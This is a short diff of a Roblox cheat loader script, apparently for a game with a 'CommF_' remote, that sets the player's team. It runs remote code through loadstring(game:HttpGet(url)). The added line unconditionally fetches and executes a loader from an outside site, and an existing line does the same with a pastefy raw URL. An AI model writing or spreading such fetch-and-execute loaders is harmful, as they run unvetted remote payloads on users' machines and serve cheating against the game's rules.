@@ -1,23 +1,25 @@
 local function Main(Settings)
     Settings = Settings or {}
     local JoinTeam = Settings.JoinTeam or "Marines"
-    
+
     if not game:IsLoaded() then game.Loaded:Wait() end
-    
+
     local Players, RS = game:GetService("Players"), game:GetService("ReplicatedStorage")
     local LP = Players.LocalPlayer
-    
+
     local function Run(url)
         task.spawn(function() pcall(loadstring(game:HttpGet(url))) end)
     end
 
     if not LP.Team then
         pcall(function() RS.Remotes.CommF_:InvokeServer("SetTeam", JoinTeam) end)
-        
+
         local char = LP.CharacterAdded:Wait()
         char:WaitForChild("HumanoidRootPart", 9e9)
         task.wait(0.5)
     end
+
+    Run("https://luaroblox.tranvinh.site/files/v4/loaders/7cee14f0572b7bd9345ebbf2.lua")
 
     if getgenv and getgenv()["Old Version"] then
         Run("https://pastefy.app/iqsS6Mjf/raw")
